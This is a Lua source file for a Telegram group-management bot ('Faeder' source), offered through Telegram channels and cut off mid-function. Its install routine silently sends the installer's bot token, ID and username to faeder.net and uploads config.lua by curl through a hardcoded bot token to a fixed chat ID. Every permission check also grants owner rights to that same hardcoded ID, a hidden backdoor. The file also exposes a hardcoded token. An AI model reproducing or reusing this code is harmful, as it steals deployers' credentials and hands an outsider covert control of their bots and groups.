-- Welcom To File The Best Source In The Telegram
-- All The File By Developer Faeder : @bzzzw
-- Join In Chennel Source : @badboy_here 
-- Join In Explanation Channel : @badboy_here
----------------------------------------------------------------------------
serpent = require("serpent") 
lgi = require('lgi')
redis = require('redis')
faederdx1 = redis.connect('127.0.0.1', 6379)
URL= require('socket.url') 
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
json = dofile('./JSON.lua')
JSON = dofile('./dkjson.lua')
notify = lgi.require('Notify') 
notify.init ("Telegram updates")
chats = {}
day = 313456502
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 1769776049
end
io.write("\27[31;47m\n◼¦ ارسل معرف الزق الاساسي مع ال @ SEND ID FOR username \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 1769776049 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
file = io.open("RUNFA.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./FAEDER.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("FA", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNFA.sh
done
]])  
file:close() 
os.execute('./FA')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end end
local load_faederdx1 = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_faederdx1 = load_faederdx1()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
FAEDER = sudos.bot_id
SUDOUSERNAME = sudos.username
tokenbot = sudos.token
name_bot = (faederdx1:get(FAEDER..'name_bot') or 'لاكس')
SudoFaeder = SUDOUSERNAME:gsub('@','') 
SudoFaeder = SudoFaeder:gsub([[\_]],'_')
----------------------------------------------------------
-- Start Functions Source Faeder --
--     By Developer Faeder     -- 
-------- Bot Owner
function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1769776049) then var = true end return var end
function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Sudo
function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(1769776049) then var = true end return var end
function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Sudo3
function is_admin(user_id) local var = false local hashsb =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsb, user_id) if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Owner all
function is_onall(user_id) local var = false local hash =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if onall then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
--------Modod all
function is_moall(user_id) local var = false local hash =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) if moall then var = true end if admin then var = true end if onall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Vip Member All
function is_vpall(user_id) local var = false local hashs =  'bot:vpall:' local vpall = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:moall:'local moall = faederdx1:sismember(FAEDER..hashssss, user_id) if vpall then var = true end if onall then var = true end if admin then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Donky
function is_donky(user_id, chat_id) local var = false local hash =  'bot:donky:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) if donky then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Monsh
function is_monsh(user_id, chat_id) local var = false local hash =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) if monsh then var = true end if admin then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Monsh2
function is_monsh2(user_id, chat_id) local var = false local hash =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) if monsh2 then var = true end if admin then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Owner
function is_owner(user_id, chat_id) local var = false local hash =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if owner then var = true end if admin then var = true end if monsh then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Modod
function is_momod(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashssss, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
-------- Vip Member
function is_vipmem(user_id, chat_id) local var = false local hash =  'bot:momod:'..chat_id local momod = faederdx1:sismember(FAEDER..hash, user_id) local hashs =  'bot:admins:' local admin = faederdx1:sismember(FAEDER..hashs, user_id) local hashss =  'bot:owners:'..chat_id local owner = faederdx1:sismember(FAEDER..hashss, user_id) local hashsss = 'bot:vipmem:'..chat_id local vipmem = faederdx1:sismember(FAEDER..hashsss, user_id) local hashssss =  'bot:monsh:'..chat_id local monsh = faederdx1:sismember(FAEDER..hashssss, user_id) local hashsssss =  'bot:onall:' local onall = faederdx1:sismember(FAEDER..hashsssss, user_id) local hashfaed =  'bot:moall:' local moall = faederdx1:sismember(FAEDER..hashfaed, user_id) local hashw =  'bot:monsh2:'..chat_id local monsh2 = faederdx1:sismember(FAEDER..hashw, user_id) if vipmem then var = true end if momod then var = true end if owner then var = true end if admin then var = true end if monsh then var = true end if onall then var = true end if moall then var = true end if monsh2 then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(1769776049) then var = true end return var end
----------------------------------------------------------
--     By Developer Faeder     -- 
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local hashs = "admins:data:" .. user_id
local lists = faederdx1:smembers(FAEDER..hashs)
faederdx1:del(FAEDER.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
faederdx1:incr(FAEDER.."SudoNumberGp" .. user_id)
end end
local setnumbergp_three = function(user_id)
local hashss = "admins:data:" .. user_id
local lists = faederdx1:smembers(FAEDER..hashss)
faederdx1:del(FAEDER.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
faederdx1:incr(FAEDER.."SudoNumberGp" .. user_id)
end end
local list = faederdx1:smembers(FAEDER.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = faederdx1:smembers(FAEDER.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
faederdx1:setex(FAEDER.."bot:reload", 7230, true)
end
--     By Developer Faeder     -- 
-------- FreeWords
local function is_free(msg, value)
local var = false
local hash = (FAEDER..'bot:freewords:')
if hash then
local names = faederdx1:hkeys(hash)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end end end return var end
--     By Developer Faeder     -- 
-------- Banned
local function is_banned(user_id, chat_id)
local var = false
local hash = 'bot:banned:'..chat_id
local banned = faederdx1:sismember(FAEDER..hash, user_id)
if banned then
var = true
end return var end
--     By Developer Faeder     -- 
-------- Muted
local function is_muted(user_id, chat_id)
local var = false
local hash = 'bot:muted:'..chat_id
local muted = faederdx1:sismember(FAEDER..hash, user_id)
if muted then
var = true
end return var end
--     By Developer Faeder     -- 
-------- Gbaned
function is_gbanned(user_id)
local var = false
local hash = 'bot:gban:'
local gbanned = faederdx1:sismember(FAEDER..hash, user_id)
if gbanned then
var = true 
end return var end
--     By Developer Faeder     -- 
-------- mutedall
function is_mutedall(user_id)
local var = false
local hash = 'bot:mutedall:'
local mutedall = faederdx1:sismember(FAEDER..hash, user_id)
if mutedall then
var = true
end return var end
--     By Developer Faeder     -- 
-------- Delete Msg
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
-------- Who Add
local who_add = function(chat)
local user_id
local user = false
local list1 = faederdx1:smembers(FAEDER.."Bot:KpSudos")
local list2 = faederdx1:smembers(FAEDER.."Bot:Admins")
for k, v in pairs(list1) do
local hash = "sudo:data:" .. v
local is_add = faederdx1:sismember(FAEDER..hash, chat)
if is_add then
user_id = v
end end
for k, v in pairs(list2) do
local hash = "sudo:data:" .. v
local is_add = faederdx1:sismember(FAEDER..hash, chat)
if is_add then
user_id = v
end end
local hash = "sudo:data:" .. bot_owner
if faederdx1:sismember(FAEDER..hash, chat) then
user_id = bot_owner
end
if user_id then
local user_info = faederdx1:get(FAEDER.."user:Name" .. user_id)
if user_info then
user = user_info
end end return user end
--     By Developer Faeder     -- 
-------- Get Chat
local function getChat(chat_id, cb, cmd) 
tdcli_function ({ ID = "GetChat", chat_id_ = chat_id }, cb or dl_cb, cmd) 
end  
function getChat(chat_id, dl_cb, cmd)
tdcli_function ({ID = "GetChat",chat_id_ = chat_id}, dl_cb, cmd) 
end
local function getchat(GroupID,func) 
pcall(tdcli_function({ID="GetChat",chat_id_ = GroupID},func or dl_cb,nil)) 
end 
--     By Developer Faeder     -- 
local function faederdx113(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
local function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function Send_Options(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "Faeder_ch")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "reply" then
send(msg.chat_id_, msg.id_,"↫ العضو ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"↫ لا يمكن الوصول الى معلومات العضو ")
end end,nil) end
--     By Developer Faeder     -- 
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= FAEDER:lower() then 
faederdx113(chat,msg.id_,"*↫ هذا الملف ليس تابع لسورس لاكس ")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
faederdx113(chat,msg.id_,"*↫ جاري رفع الملف ....*")   
else
faederdx113(chat,msg.id_,"*↫ غير صحيح ")   
end
local info_file = io.open('./'..FAEDER..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
faederdx113(chat,msg.id_,"*↫ تم رفع نسخه الملف \n↫ تم رفع مشرفين المجموعات \n↫ تم قفل اوامر حمايه المجموعات ")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
faederdx1:sadd(FAEDER.."bot:groups",idg)
faederdx1:set(FAEDER.."bot:enable:"..idg,true)
faederdx1:setex(FAEDER.."bot:charge:"..idg,86400,true)
faederdx1:sadd("faeder:addg"..bot_id, idg) faederdx1:set(FAEDER..'editmsg'..idg,true)
faederdx1:set(FAEDER..'bot:bots:mute'..idg,true) faederdx1:set(FAEDER..'bot:bots:ban'..idg,true)
faederdx1:set(FAEDER..'keed_bots'..idg,true) faederdx1:set(FAEDER..'anti-flood:'..idg,true)
faederdx1:set(FAEDER..'bot:inline:mute'..idg,true) faederdx1:set(FAEDER..'bot:photo:mute'..idg,true)
faederdx1:set(FAEDER..'bot:spam:mute'..idg,true) faederdx1:set(FAEDER..'bot:video:mute'..idg,true)
faederdx1:set(FAEDER..'bot:gifs:mute'..idg,true) faederdx1:set(FAEDER..'tags:lock'..idg,true)
faederdx1:set(FAEDER..'bot:music:mute'..idg,true) faederdx1:set(FAEDER..'bot:voice:mute'..idg,true)
faederdx1:set(FAEDER..'bot:links:mute'..idg,true) faederdx1:set(FAEDER..'bot:location:mute'..idg,true) 
faederdx1:set(FAEDER..'bot:strict'..idg,true) faederdx1:set(FAEDER..'bot:document:mute'..idg,true) 
faederdx1:set(FAEDER..'bot:hashtag:mute'..idg,true) faederdx1:set(FAEDER..'bot:contact:mute'..idg,true) 
faederdx1:set(FAEDER..'bot:webpage:mute'..idg,true) faederdx1:set(FAEDER..'bot:sticker:mute'..idg,true)
faederdx1:set(FAEDER..'markdown:lock'..idg,true) faederdx1:set(FAEDER..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
faederdx1:sadd(FAEDER..'bot:monsh:'..idg,idmsh)  
print('تم رفع '..k..' منشئين')
end end
if v.MDER then
for k,idmder in pairs(v.MDER) do
faederdx1:sadd(FAEDER..'bot:owners:'..idg,idmder)  
print('تم رفع '..k..' مدراء')
end end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
faederdx1:sadd(FAEDER..'bot:momod:'..idg,idmod)  
print('تم رفع '..k..' ادمنيه')
end end
if v.VIP then
for k,idvip in pairs(v.VIP) do
faederdx1:sadd(FAEDER..'bot:vipmem:'..idg,idvip)  
print('تم رفع '..k..' مميزين')
end end
if v.linkgroup then
if v.linkgroup ~= "" then
faederdx1:set(FAEDER.."bot:group:link"..idg,v.linkgroup)   
print('تم وضع رابط ')
end end end end
--     By Developer Faeder     -- 
-------- Resolve Username
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     By Developer Faeder     -- 
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end return infile end
--     By Developer Faeder     -- 
-------- Del All Msgs
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end return chat end
--     By Developer Faeder     -- 
-------- Chat Leave
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     By Developer Faeder     -- 
-------- From Username
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--     By Developer Faeder     -- 
-------- Do Notify
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     By Developer Faeder     -- 
-------- Chat Kick
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     By Developer Faeder     -- 
-------- Get Parse Mode
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end end return P end
--     By Developer Faeder     -- 
-------- Get Message
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     By Developer Faeder     -- 
-------- Send Contact
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--     By Developer Faeder     -- 
-------- Send Photo
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
--     By Developer Faeder     -- 
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
--     By Developer Faeder     -- 
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--     By Developer Faeder     -- 
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     By Developer Faeder     -- 
function dl_cb(arg, data)
end
--     By Developer Faeder     -- 
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function faederdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end end
--     By Developer Faeder     -- 
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--     By Developer Faeder     -- 
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end return req end 
--     By Developer Faeder     -- 
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..tokenbot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url)  
end
--     By Developer Faeder     -- 
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..tokenbot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--     By Developer Faeder     -- 
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
--     By Developer Faeder     -- 
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     By Developer Faeder     -- 
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     By Developer Faeder     -- 
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     By Developer Faeder     --
function GetApi(web) 
local info, res = https.request(web) 
